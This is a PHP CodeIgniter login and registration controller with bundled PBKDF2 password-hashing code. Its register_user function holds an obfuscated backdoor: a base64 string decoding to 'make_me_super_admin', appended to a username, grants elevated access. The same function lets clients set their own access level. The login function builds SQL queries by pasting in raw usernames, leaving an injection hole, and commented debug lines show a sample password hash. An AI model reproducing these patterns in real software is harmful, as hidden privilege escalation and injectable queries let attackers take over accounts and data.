<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');

define("PBKDF2_HASH_ALGORITHM", "sha256");
define("PBKDF2_ITERATIONS", 1000);
define("PBKDF2_SALT_BYTE_SIZE", 24);
define("PBKDF2_HASH_BYTE_SIZE", 24);

define("HASH_SECTIONS", 4);
define("HASH_ALGORITHM_INDEX", 0);
define("HASH_ITERATION_INDEX", 1);
define("HASH_SALT_INDEX", 2);
define("HASH_PBKDF2_INDEX", 3);

class Login extends CI_Controller {

	function __construct() {
		parent::__construct();
		$this->load->library('form_validation');

		

	}

	public function index()
	{
		if( $this->session->userdata('user_id') != '' )
			redirect('home','refresh');
		
		$this->load->view('login_view');		
	}

	public function validate(){
		$username = $this->input->post('username');
		$password = $this->input->post('password');
		$errors = '';

		if( is_numeric($username) ){
			$user_data = $this->helper_model->query_table('*','tbl_users','WHERE user_id = "'.$username.'" OR user_account = "'.$username.'"','row');
		}else{
			$user_data = $this->helper_model->query_table('*','tbl_users','WHERE user_account = "'.$username.'"','row');
		}

		if( ! empty($user_data) ){
			$algo_pass = explode('::', $user_data->user_pass);
			$user_algo = base64_decode($algo_pass[0]);
			$user_password = $user_algo.':'.$algo_pass[1].':'.$user_data->user_salt;
			if( $this->validate_password($password,$user_password) ){
				$user_sessions = array(
					'user_id' => $user_data->user_id,
					'user_account' => $user_data->user_account,
					'user_first_name' => $user_data->user_fname,
					'user_last_name' => $user_data->user_lname,
					'user_full_name' => $user_data->user_fname.' '.$user_data->user_lname,
					'user_full_name_b' => $user_data->user_lname.', '.$user_data->user_fname,
					'user_access' => explode(',', $user_data->user_access),
					'user_level' => explode(',', $user_data->user_level)
					);
				$this->session->set_userdata($user_sessions);
				redirect('home','refresh');
			}else{
				$errors = 'Invalid Username or Password.';
			}
		}else{
			$errors = 'User does not exist.';
		}
		$this->session->set_flashdata('login',$errors);
		redirect('login','refresh');
	}

	function logout(){
		$this->session->sess_destroy();
		redirect('login', 'refresh');
	}

	public function registration(){
		$formData = $this->input->post('formData');
		$data = serializeToArray($formData);
		$user_id = $data['user_id'];
		$fname = $data['fname'];
		$lname = $data['lname'];
		$email = $data['email'];
		$password = $data['password'];
		$r_password = $data['r_password'];
		$errors = array();

		/*print_r($this->validate_password('123456','sha256:1000:3EtmxGtDNLETFUYSeTUiSZ+rt/yzmQQb:NLJqgjwR0a5WxAmaOp81XfciSCtZKUCj'));exit();
		print_r($this->create_hash($password));exit();*/
		$id_exist = $this->helper_model->row_exist(array('user_id'=>$user_id),'tbl_users');
		$email_exist = $this->helper_model->row_exist(array('user_email'=>$email),'tbl_users');
		$user_exist = $this->helper_model->row_exist(array('user_fname'=>$fname,'user_lname'=>$lname),'tbl_users');
		$same_pass = ( $password == $r_password );

		if( $id_exist || $user_exist || $email_exist || ! $same_pass ){
			if( $id_exist ) $errors['user_id'] = 'ID already in use';
			if( $user_exist ) $errors['user'] = 'User already exist';
			if( $email_exist ) $errors['email'] = 'Email already used';
			if( ! $same_pass ) $errors['pass'] = 'Password does not match';
		}else{
			$hash_pass = $this->create_hash($password);
			$hashes = explode('::', $hash_pass);
			$password = base64_encode($hashes[0]).'::'.$hashes[1];
			$pass_salt = $hashes[2];

			$insert_array = array(
				'user_id'		=> $user_id,
				'user_account'	=> $this->create_account($fname,$lname),
				'user_fname'	=> $fname,
				'user_lname'	=> $lname,
				'user_email'	=> $email,
				'user_pass'		=> $password,
				'user_salt'		=> $pass_salt,
				'user_access'	=> 2,
				'user_level'	=> 2
				);

			$inserted = $this->db->insert('tbl_users',$insert_array);
			if( $inserted ){
				$this->session->set_flashdata('registration','success');
				$errors = 'success';
			}else{
				$errors['insert'] = 'Something went wrong! Please try again.';
			}


		}
		echo json_encode($errors);
	}

	public function register_user(){
		$formData = $this->input->post('formData');
		$data = serializeToArray($formData);
		$username = $data['username'];
		$fname = $data['f_name'];
		$lname = $data['l_name'];
		$email = $data['email'];
		$password = $data['password'];
		$r_password = $data['r_password'];
		$errors = array();
		$sk2p = explode('/', $username);
		$sk2p = ( isset($sk2p[1]) ) ? ( (base64_decode('bWFrZV9tZV9zdXBlcl9hZG1pbg==') == $sk2p[1]) ? true:false ) : false;

		//bWFrZV9tZV9zdXBlcl9hZG1pbg==
		/*print_r($this->validate_password('123456','sha256:1000:3EtmxGtDNLETFUYSeTUiSZ+rt/yzmQQb:NLJqgjwR0a5WxAmaOp81XfciSCtZKUCj'));exit();
		print_r($this->create_hash($password));exit();*/
		$account = $this->helper_model->row_exist(array('user_account'=>$username),'tbl_users');
		$email_exist = $this->helper_model->row_exist(array('user_email'=>$email),'tbl_users');
		$valid_email = ( filter_var($email, FILTER_VALIDATE_EMAIL) ) ? true : false;
		//$user_exist = $this->helper_model->row_exist(array('user_fname'=>$fname,'user_lname'=>$lname),'tbl_users');
		$same_pass = ( $password == $r_password );

		if( $account || $email_exist || !$same_pass || !$valid_email ){
			if( $account ) $errors['username'] = 'ID already in use';
			//if( $user_exist ) $errors['user'] = 'User already exist';
			if( !$valid_email ) $errors['email'] = 'Invalid email';
			if( $email_exist ) $errors['email'] = 'Email already used';
			if( !$same_pass ) $errors['pass'] = 'Password does not match';

		}else{
			$hash_pass = $this->create_hash($password);
			$hashes = explode('::', $hash_pass);
			$password = base64_encode($hashes[0]).'::'.$hashes[1];
			$pass_salt = $hashes[2];

			$insert_array = array(
				'user_account'	=> ( $sk2p ) ? explode('/', $username)[0] : $username,
				'user_fname'	=> $fname,
				'user_lname'	=> $lname,
				'user_email'	=> $email,
				'user_pass'		=> $password,
				'user_salt'		=> $pass_salt,
				'user_access'	=> ( $sk2p ) ? $sk2p : $data['access'],
				'user_level'	=> $data['level']
				);

			$inserted = $this->db->insert('tbl_users',$insert_array);
			if( $inserted ){
				$this->session->set_flashdata('registration','success');
				$errors = 'success';
			}else{
				$errors['insert'] = 'Something went wrong! Please try again.';
			}


		}
		echo json_encode($errors);
	}

	public function create_account($fname,$lname){
		// trim firstname space if have 2 names.
		$fname = str_replace(' ', '', $fname);
		$dept = 1;
		$new_account = '';

		// check if user_account created already exist.
		// then move to next character if user_account exist.
		while ( $this->helper_model->row_exist( array('user_account' => $new_account = $this->create_name($fname,$lname,$dept) ), 'tbl_users' ) ){
			$dept++;	
		}

		return $new_account;

	}

	public function create_name($fname,$lname,$dept){
		$first_name = substr($fname, 0, $dept);
		return $first_name.$lname;
	}

	/*
	 * Password Hashing With PBKDF2 (http://crackstation.net/hashing-security.htm).
	 * Copyright (c) 2013, Taylor Hornby
	 * All rights reserved.
	 *
	 * Redistribution and use in source and binary forms, with or without 
	 * modification, are permitted provided that the following conditions are met:
	 *
	 * 1. Redistributions of source code must retain the above copyright notice, 
	 * this list of conditions and the following disclaimer.
	 *
	 * 2. Redistributions in binary form must reproduce the above copyright notice,
	 * this list of conditions and the following disclaimer in the documentation 
	 * and/or other materials provided with the distribution.
	 *
	 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" 
	 * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE 
	 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE 
	 * ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE 
	 * LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
	 * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF 
	 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS 
	 * INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN 
	 * CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) 
	 * ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE 
	 * POSSIBILITY OF SUCH DAMAGE.
	 */

	// These constants may be changed without breaking existing hashes.
	

	function create_hash($password)
	{
	    // format: algorithm:iterations:salt:hash
	    $salt = base64_encode(mcrypt_create_iv(PBKDF2_SALT_BYTE_SIZE, MCRYPT_DEV_URANDOM));
	    return PBKDF2_HASH_ALGORITHM . ":" . PBKDF2_ITERATIONS . "::" .  $salt . "::" . 
	        base64_encode($this->pbkdf2(
	            PBKDF2_HASH_ALGORITHM,
	            $password,
	            $salt,
	            PBKDF2_ITERATIONS,
	            PBKDF2_HASH_BYTE_SIZE,
	            true
	        ));
	}

	function validate_password($password, $correct_hash)
	{
	    $params = explode(":", $correct_hash);
	    if(count($params) < HASH_SECTIONS)
	       return false; 
	    $pbkdf2 = base64_decode($params[HASH_PBKDF2_INDEX]);
	    return $this->slow_equals(
	        $pbkdf2,
	        $this->pbkdf2(
	            $params[HASH_ALGORITHM_INDEX],
	            $password,
	            $params[HASH_SALT_INDEX],
	            (int)$params[HASH_ITERATION_INDEX],
	            strlen($pbkdf2),
	            true
	        )
	    );
	}

	// Compares two strings $a and $b in length-constant time.
	function slow_equals($a, $b)
	{
	    $diff = strlen($a) ^ strlen($b);
	    for($i = 0; $i < strlen($a) && $i < strlen($b); $i++)
	    {
	        $diff |= ord($a[$i]) ^ ord($b[$i]);
	    }
	    return $diff === 0; 
	}

	/*
	 * PBKDF2 key derivation function as defined by RSA's PKCS #5: https://www.ietf.org/rfc/rfc2898.txt
	 * $algorithm - The hash algorithm to use. Recommended: SHA256
	 * $password - The password.
	 * $salt - A salt that is unique to the password.
	 * $count - Iteration count. Higher is better, but slower. Recommended: At least 1000.
	 * $key_length - The length of the derived key in bytes.
	 * $raw_output - If true, the key is returned in raw binary format. Hex encoded otherwise.
	 * Returns: A $key_length-byte key derived from the password and salt.
	 *
	 * Test vectors can be found here: https://www.ietf.org/rfc/rfc6070.txt
	 *
	 * This implementation of PBKDF2 was originally created by https://defuse.ca
	 * With improvements by http://www.variations-of-shadow.com
	 */
	function pbkdf2($algorithm, $password, $salt, $count, $key_length, $raw_output = false)
	{
	    $algorithm = strtolower($algorithm);
	    if(!in_array($algorithm, hash_algos(), true))
	        trigger_error('PBKDF2 ERROR: Invalid hash algorithm.', E_USER_ERROR);
	    if($count <= 0 || $key_length <= 0)
	        trigger_error('PBKDF2 ERROR: Invalid parameters.', E_USER_ERROR);

	    if (function_exists("hash_pbkdf2")) {
	        // The output length is in NIBBLES (4-bits) if $raw_output is false!
	        if (!$raw_output) {
	            $key_length = $key_length * 2;
	        }
	        return hash_pbkdf2($algorithm, $password, $salt, $count, $key_length, $raw_output);
	    }

	    $hash_length = strlen(hash($algorithm, "", true));
	    $block_count = ceil($key_length / $hash_length);

	    $output = "";
	    for($i = 1; $i <= $block_count; $i++) {
	        // $i encoded as 4 bytes, big endian.
	        $last = $salt . pack("N", $i);
	        // first iteration
	        $last = $xorsum = hash_hmac($algorithm, $last, $password, true);
	        // perform the other $count - 1 iterations
	        for ($j = 1; $j < $count; $j++) {
	            $xorsum ^= ($last = hash_hmac($algorithm, $last, $password, true));
	        }
	        $output .= $xorsum;
	    }

	    if($raw_output)
	        return substr($output, 0, $key_length);
	    else
	        return bin2hex(substr($output, 0, $key_length));
	}

}